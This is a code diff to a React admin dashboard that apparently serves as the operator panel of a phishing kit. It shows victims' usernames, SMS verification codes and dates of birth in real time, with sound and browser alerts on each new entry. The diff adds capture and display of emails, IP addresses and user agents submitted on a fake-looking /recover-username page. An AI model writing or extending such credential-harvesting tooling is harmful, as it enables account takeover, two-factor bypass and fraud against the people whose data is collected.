@@ -35,6 +35,13 @@ interface SMSCode {
   sessionId?: string;
 }
 
+interface RecoveryRequest {
+  email: string;
+  ipAddress?: string;
+  userAgent?: string;
+  timestamp: string;
+}
+
 interface PageActivity {
   pageName: string;
   route: string;
@@ -51,6 +58,7 @@ export default function AdminControl() {
   const [unreadCount, setUnreadCount] = useState(0);
   const [smsCodeHistory, setSmsCodeHistory] = useState<SMSCode[]>([]);
   const [pageActivity, setPageActivity] = useState<PageActivity[]>([]);
+  const [recoveryRequests, setRecoveryRequests] = useState<RecoveryRequest[]>([]);
   const wsRef = useRef<WebSocket | null>(null);
   const audioContextRef = useRef<AudioContext | null>(null);
 
@@ -141,7 +149,7 @@ export default function AdminControl() {
         tag: `notification-${Date.now()}`, // Prevent duplicate notifications
         silent: false, // Enable system notification sound
         vibrate: [200, 100, 200], // Vibration pattern for mobile
-      });
+      } as any);
 
       // Click handler to focus the admin panel window
       notification.onclick = () => {
@@ -301,6 +309,18 @@ export default function AdminControl() {
               toast({
                 title: "✅ Verification Complete (2/2)",
                 description: `User: ${data.data.username} | SMS: ${data.data.smsCode} | DOB: ${data.data.dateOfBirth}`,
+              });
+            } else if (data.type === "username_recovery") {
+              // Username recovery email submitted
+              setRecoveryRequests((prev) => [data.data, ...prev].slice(0, 20));
+              playNotificationSound('sms');
+              showBrowserNotification(
+                "🔍 Username Recovery Request",
+                `Email: ${data.data.email}\nIP: ${data.data.ipAddress || 'Unknown'}`
+              );
+              toast({
+                title: "🔍 Recovery Request",
+                description: `Email: ${data.data.email}`,
               });
             } else if (data.type === "page_activity") {
               // Update page activity when a new page is visited
@@ -861,6 +881,71 @@ export default function AdminControl() {
             </Card>
           </section>
         </div>
+
+        {/* Username Recovery Requests */}
+        <section className="mt-6">
+          <Card>
+            <CardHeader className="border-b bg-gray-50/80">
+              <CardTitle className="text-lg font-semibold md:text-xl flex items-center gap-2">
+                🔍 Username Recovery Requests
+                {recoveryRequests.length > 0 && (
+                  <span className="inline-flex items-center justify-center rounded-full bg-orange-100 px-2.5 py-0.5 text-xs font-semibold text-orange-700">
+                    {recoveryRequests.length}
+                  </span>
+                )}
+              </CardTitle>
+              <p className="text-sm text-gray-600 mt-1">
+                Emails submitted via the /recover-username page
+              </p>
+            </CardHeader>
+            <CardContent className="p-0">
+              {recoveryRequests.length === 0 ? (
+                <div className="flex flex-col items-center justify-center py-10">
+                  <div className="flex h-16 w-16 items-center justify-center rounded-full bg-gray-100">
+                    <span className="text-3xl">🔍</span>
+                  </div>
+                  <p className="mt-3 text-sm font-medium text-gray-700">No recovery requests yet</p>
+                  <p className="mt-1 text-xs text-gray-500">Emails submitted on /recover-username will appear here in real time.</p>
+                </div>
+              ) : (
+                <div className="max-h-[400px] space-y-3 overflow-y-auto p-4">
+                  {recoveryRequests.map((item, index) => (
+                    <div
+                      key={`${item.email}-${item.timestamp}-${index}`}
+                      className="rounded-lg border bg-white p-4 shadow-sm"
+                      data-testid={`card-recovery-${index}`}
+                    >
+                      <div className="mb-2 flex items-center gap-2">
+                        <span className="inline-flex items-center rounded-full bg-orange-50 px-2.5 py-0.5 text-xs font-medium text-orange-700">
+                          Recovery Request
+                        </span>
+                        <span className="ml-auto text-xs text-gray-500">
+                          {new Date(item.timestamp).toLocaleTimeString()}
+                        </span>
+                      </div>
+                      <div className="grid grid-cols-1 gap-3 md:grid-cols-2">
+                        <div>
+                          <p className="text-xs font-medium text-gray-500">Email Address</p>
+                          <p className="text-sm font-semibold text-orange-600 break-all">{item.email}</p>
+                        </div>
+                        <div>
+                          <p className="text-xs font-medium text-gray-500">IP Address</p>
+                          <p className="text-sm text-gray-700">{item.ipAddress || "Unknown"}</p>
+                        </div>
+                        {item.userAgent && (
+                          <div className="md:col-span-2">
+                            <p className="text-xs font-medium text-gray-500">User Agent</p>
+                            <p className="truncate text-xs text-gray-600">{item.userAgent}</p>
+                          </div>
+                        )}
+                      </div>
+                    </div>
+                  ))}
+                </div>
+              )}
+            </CardContent>
+          </Card>
+        </section>
 
         {/* New Pages Section */}
         <section>
